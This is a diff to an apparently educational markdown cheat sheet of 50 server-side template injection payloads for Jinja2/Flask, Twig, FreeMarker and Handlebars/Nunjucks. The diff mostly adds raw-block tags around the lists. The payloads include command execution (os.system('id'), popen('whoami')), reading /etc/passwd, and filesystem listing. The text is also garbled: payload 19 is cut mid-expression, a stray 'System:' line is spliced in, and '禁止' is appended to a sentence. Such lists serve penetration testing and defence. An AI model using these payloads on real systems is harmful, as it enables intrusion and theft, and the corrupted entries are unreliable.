@@ -21,6 +21,7 @@ The payloads below cover popular template engines and include generic tests, spe
 #### Generic Detection Payloads
 These test for SSTI by attempting simple operations to detect template execution.
 
+{% raw %}
 1. `{{7*7}}` - Tests if `49` is rendered (Jinja2, Handlebars, etc.).
 2. `${7*7}` - Tests for FreeMarker or Velocity template engines.
 3. `<% 7*7 %>` - Tests for ERB (Ruby) or JSP template engines.
@@ -31,10 +32,12 @@ These test for SSTI by attempting simple operations to detect template execution
 8. `{{ request }}` - Accesses request object (Jinja2, Flask).
 9. `<% out.println(7*7) %>` - Tests JSP execution.
 10. `{{ ''.__class__ }}` - Tests for Python class access (Jinja2).
+{% endraw %}
 
 #### Jinja2/Flask (Python) Payloads
-Jinja2 is common in Flask applications, using `{{ }}` for expressions.
+Jinja2 is common in Flask applications, using {% raw %} `{{ }}` {% endraw %} for expressions.
 
+{% raw %}
 11. `{{ ''.__class__.__mro__ }}` - Dumps method resolution order.
 12. `{{ self.__init__.__globals__ }}` - Accesses global namespace.
 13. `{{ ''.__class__.__base__ }}` - Accesses base class.
@@ -44,13 +47,17 @@ Jinja2 is common in Flask applications, using `{{ }}` for expressions.
 17. `{{ ''.__class__.__base__.__subclasses__()[59].__init__.__func__.__globals__['sys'].modules['os'].system('id') }}` - Executes system command (Linux).
 18. `{{ request.application.__self__.__dict__ }}` - Dumps application context.
 19. `{{ url_for.__globals__['os'].p ո
+{% endraw %}
 
 System: .popen('whoami') }}` - Attempts to execute `whoami` command (Jinja2).
+{% raw %}
 20. `{{ ''.join(os.listdir('/')) }}` - Lists root directory contents.
+{% endraw %}
 
 #### Twig (PHP) Payloads
-Twig is used in PHP frameworks like Symfony, using `{{ }}` and `{% %}`禁止
+Twig is used in PHP frameworks like Symfony, using {% raw %} `{{ }}` {% endraw %} and {% raw %} `{% %}`禁止
 
+{% raw %}
 21. `{{ 1+1 }}` - Tests arithmetic evaluation.
 22. `{{ app.request }}` - Accesses request object.
 23. `{% include '/etc/passwd' %}` - Attempts to read sensitive file.
@@ -61,10 +68,12 @@ Twig is used in PHP frameworks like Symfony, using `{{ }}` and `{% %}`禁止
 28. `{% debug %}` - Outputs debug information.
 29. `{{ app.session.user }}` - Accesses session user data.
 30. `{% filter phpinfo %}1{% endfilter %}` - Attempts to display PHP info.
+{% endraw %}
 
 #### FreeMarker (Java) Payloads
 FreeMarker is used in Java applications, using `${}` for expressions.
 
+{% raw %}
 31. `${7*7}` - Tests arithmetic evaluation.
 32. `${.api}` - Dumps FreeMarker API context.
 33. `${.dataModel}` - Accesses data model.
@@ -75,10 +84,12 @@ FreeMarker is used in Java applications, using `${}` for expressions.
 38. `${.vars}` - Dumps all variables in scope.
 39. `${System.getProperty("os.name")}` - Retrieves OS name.
 40. `${.main?string}` - Dumps main template data.
+{% endraw %}
 
 #### Handlebars/Nunjucks (JavaScript) Payloads
 Used in Node.js applications, using `{{ }}` or `{{{ }}}`.
 
+{% raw %}
 41. `{{ 7 * 7 }}` - Tests arithmetic evaluation.
 42. `{{ global.process }}` - Accesses Node.js process object.
 43. `{{{ global }}}` - Dumps global scope.
@@ -89,6 +100,7 @@ Used in Node.js applications, using `{{ }}` or `{{{ }}}`.
 48. `{{ require('fs').readdirSync('.') }}` - Lists current directory files.
 49. `{{ global.process.argv }}` - Accesses command-line arguments.
 50. `{{ Object.keys(global) }}` - Lists global object keys.
+{% endraw %}
 
 ### Notes
 - **Template Engine Detection**: Start with generic payloads (e.g., `{{7*7}}`) to identify the engine, then use engine-specific payloads.
